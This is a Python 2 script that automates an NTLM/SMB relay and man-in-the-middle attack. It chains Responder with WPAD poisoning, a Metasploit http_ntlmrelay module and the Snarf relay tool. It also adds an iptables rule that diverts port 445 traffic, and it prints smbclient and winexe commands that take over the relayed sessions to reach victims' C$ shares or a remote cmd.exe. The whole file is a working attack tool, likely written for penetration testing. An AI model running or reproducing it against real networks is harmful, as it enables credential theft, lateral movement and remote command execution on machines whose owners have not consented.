#!/usr/bin/env python2

import os
import sys
import getpass
import argparse
import time
import urllib2
from shutil import copyfile, move
from subprocess import Popen, PIPE
from libnmap.process import NmapProcess
from netifaces import interfaces, ifaddresses, AF_INET
from libnmap.parser import NmapParser, NmapParserException

def parse_args():
    '''
    Create the arguments
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-x", "--nmapxml", help="Location of nmap XML file")
    parser.add_argument("-f", "--home-dir", default='/opt/', help="Enter the folder to install the various tools to; e.g. -d '/opt/'")
    parser.add_argument("-i", "--interface", help="Enter the interface that Responder will start on")
    return parser.parse_args()

def get_git_project(github_url, home_dir):
    '''
    Install git projects and check for errors
    '''
    proj_name = github_url.split('/')[-1]
    folder = home_dir+proj_name+'/'
    exists = os.path.isdir(folder)
    if exists == False:
        cmd = 'git clone {} {}'.format(github_url,folder)
        out, err, pid = run_cmd(cmd)
        install_checker(err, proj_name)

def install_checker(err, proj_name):
    '''
    Check for errors after installing git projects
    '''
    if err != '':
        # git will pipe "Cloning into '/opt/path'..." into err 
        # for some reason
        if 'Cloning into' not in err:
            sys.exit('[-] Failed to install '+proj_name+':'+'\n\n'+err)

def get_smb_hosts(report, home_dir):
    '''
    Read the nmap XML and parse out SMB clients
    '''
    smb_hosts = []
    for host in report.hosts:
        ip = host.address
        if host.is_up():
            for s in host.services:
                if s.port == 445 and s.state == 'open':
                    smb_hosts.append(host.address)

    with open('{}smb_hosts.txt'.format(home_dir), 'w') as smb:
        for h in smb_hosts:
            smb.write(h+'\n')

def get_nodejs():
    '''
    Install nodejs
    '''
    cmd = 'apt-get install nodejs -y'
    out, err, pid = run_cmd(cmd)
    install_checker(err, 'nodejs')
    if 'is already the newest version' in out:
        print '[*] Nodejs already installed'
    elif 'Setting up nodejs' in out:
        print '[*] Successfully installed nodejs'

def run_cmd(cmd):
    '''
    Runs a command and returns the output and error msgs
    If given a list of commands, it just runs them all and returns nothing
    '''
    # Only cleanup() will give it a list
    if type(cmd) == list:
        for c in cmd:
            print '[*] Running: {}'.format(c)
            os.system(c)
    else:
        print '[*] Running: {}'.format(cmd)
        proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
        pid = proc.pid
        out, err = proc.communicate()
        return out, err, pid

def start_msf_http_relay(ip, home_dir):
    '''
    Starts http relaying with msfconsole
    '''
    options = 'use auxiliary/server/http_ntlmrelay\n'
    options += 'set URIPATH /wpad.dat\n'
    options += 'set SRVHOST {}\n'.format(ip)
    options += 'set SRVPORT 80\n'
    options += 'set RHOST {}\n'.format(ip)
    options += 'set RPORT 445\n'
    options += 'set RTYPE SMB_LS\n'
    options += 'run'
    with open('{}http_relay.rc'.format(home_dir), 'w') as f:
        f.write(options)

    # Start MSF on drone
    # MUST 'msfconsole -L' or else screen exits as soon as it 
    # reaches end of script
    cmd = 'screen -S http-relay -dm msfconsole -L -r {}http_relay.rc'.format(home_dir)
    out, err, msf_pid = run_cmd(cmd)
    return msf_pid

def start_responder(iface, home_dir):
    '''
    Starts Responder for relaying SMB
    '''
    github_url = 'https://github.com/SpiderLabs/Responder'
    get_git_project(github_url, home_dir)
    adjust_responder_conf(home_dir)

    cmd = 'screen -S relay-responder -dm python {}Responder/Responder.py -I {} -r -d --wpad'.format(home_dir, iface)
    out, err, resp_pid = run_cmd(cmd)
    return resp_pid

def adjust_responder_conf(home_dir):
    '''
    Changes Responder.conf to work with snarf
    '''
    relay_conf = []
    r = urllib2.urlopen('https://raw.githubusercontent.com/SpiderLabs/Responder/master/Responder.conf')
    conf_file = r.read()
    with open('orig-Responder.conf', 'w') as o:
        o.write(conf_file)
    copyfile('orig-Responder.conf', 'copy-Responder.conf')
    with open('copy-Responder.conf', 'r') as c:
        for line in c.readlines():
            if 'SMB = On\n' == line:
                relay_conf.append('SMB = Off\n')
            elif 'HTTP = On\n' == line:
                relay_conf.append('HTTP = Off\n')
            elif 'HTTPS = On\n' == line:
                relay_conf.append('HTTPS = Off\n')
            else:
                relay_conf.append(line)
    with open('Responder.conf', 'w') as r:
        for line in relay_conf:
            r.write(line)

    move('Responder.conf', '{}Responder/Responder.conf'.format(home_dir))

def cleanup(pids, home_dir):
    '''
    Kills all the processes created
    '''
    for p in pids:
        print '[*] Killing {}'.format(p[1])
        os.system('kill {}'.format(p[0]))

    cmds = [ "iptables -t nat -F",
            "iptables -t nat -X"]
    run_cmd(cmds)

    orig_conf = os.getcwd()+'/orig-Responder.conf'
    resp_conf = '{}Responder/Responder.conf'.format(home_dir)
    move(orig_conf, resp_conf)

def confirm(pids):
    '''
    Confirms snarf, msfconsole, and responder are all running
    '''
    errors = False
    print '\n[*] Confirming all tools are running...'
    for pid in pids:
        pid = pid
        proc_running = is_process_running(pid[0])
        if proc_running == False:
            print '[-] Error: {} not running'.format(pid[1])
            errors = True

    if errors == False:
        print '    \_ Confirmed'


def is_process_running(process_id):
    try:
        os.kill(process_id, 0)
        return True
    except OSError:
        return False

def main(args):

    # Initial var setup
    if os.geteuid():
        sys.exit('['+R+'-'+W+'] Please run as root')

    home_dir = args.home_dir
    iface = args.interface
    ip = ifaddresses(iface)[AF_INET][0]['addr']
    report = NmapParser.parse_fromfile(args.nmapxml)

    # Get Snarf
    github_url = 'https://github.com/purpleteam/snarf'
    get_git_project(github_url, home_dir)

    # Get Nodejs
    get_nodejs()

    # Start MSF http_relay
    msf_pid = start_msf_http_relay(ip, home_dir)

    # Get SMB hosts
    report = NmapParser.parse_fromfile(args.nmapxml)
    get_smb_hosts(report, home_dir)

    # Run Snarf
    cmd = 'screen -S snarf -dm nodejs {}snarf/snarf.js -f {}smb_hosts.txt {}'.format(home_dir, home_dir, ip)
    out, err, snarf_pid = run_cmd(cmd)

    # Run Snarf iptables cmd
    time.sleep(5) # Give snarf time to startup
    cmd = 'iptables -t nat -A PREROUTING -p tcp --dport 445 -j SNARF'
    out, err, iptables_pid = run_cmd(cmd)

    # Start Responder
    resp_pid = start_responder(iface, home_dir)

    # Check that everything ran as it should
    # Need pid+1 because screen -Sdm causes a fork and execcve
    # forcing the real screen process to become pid+1
    pids = [(resp_pid+1, 'Responder'),
            (msf_pid+1, 'Metasploit http_relay'),
            (snarf_pid+1, 'Snarf')]
    confirm(pids)

    print '\n[+] Done! Point your browser to http://localhost:4001 and refresh it every few minutes to see MITM\'d SMB connections'
    print '    After a connection has expired or you manually expire and choose it it run:'
    print '       smbclient -U a%a //127.0.0.1/C$'
    print '    If the initiator of the SMB connection has admin rights try:'
    print '       winexe -U a%a //127.0.0.1/ cmd.exe'
    print '\n[*] Ctrl-C to cleanup'

    try:
        while 1:
            time.sleep(10)
    except KeyboardInterrupt:
        cleanup(pids, home_dir)
        sys.exit()

main(parse_args())

